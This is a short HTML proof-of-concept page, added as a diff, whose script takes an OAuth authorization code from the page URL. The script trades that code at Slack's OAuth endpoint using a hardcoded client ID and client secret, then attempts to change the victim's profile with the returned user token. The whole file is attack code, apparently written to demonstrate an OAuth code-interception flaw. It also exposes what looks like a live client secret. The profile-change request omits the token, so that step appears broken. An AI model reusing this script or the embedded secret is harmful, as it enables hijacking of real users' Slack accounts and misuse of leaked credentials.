@@ -1,0 +1,36 @@
+<!doctype html>
+<html>
+<head>
+    <title>POC</title>
+</head>
+<body>
+</body>
+<script>
+
+
+var secret = "d1504fa6b0129662f981951c92120295";
+var id = "1021671975639.1832067875859";
+
+//const params = new URLSearchParams(document.location.href);
+var code = document.location.href.split("?")[1].split("&")[0].split('=')[1];
+var data = "code="+code+"&client_id="+id+"&client_secret="+secret;
+
+var fetchemail = (token) => {
+    var d = '{"profile":{"first_name":"test"}}';
+    fetch("https://slack.com/api/users.profile.set",{method:"POST",headers:{"Content-Type":"application/json"}, body:d}).then(
+        response => response.json()).then((json) => {
+            console.log(json);
+        })
+}
+
+fetch("https://slack.com/api/oauth.v2.access",{method: "POST", headers:{"Content-Type":"application/x-www-form-urlencoded"}, body: data}).then(
+    response => response.json()
+).then((json) => {
+    console.log(json);
+    fetchemail(json["authed_user"]["access_token"]);
+});
+
+
+</script>
+
+</html>
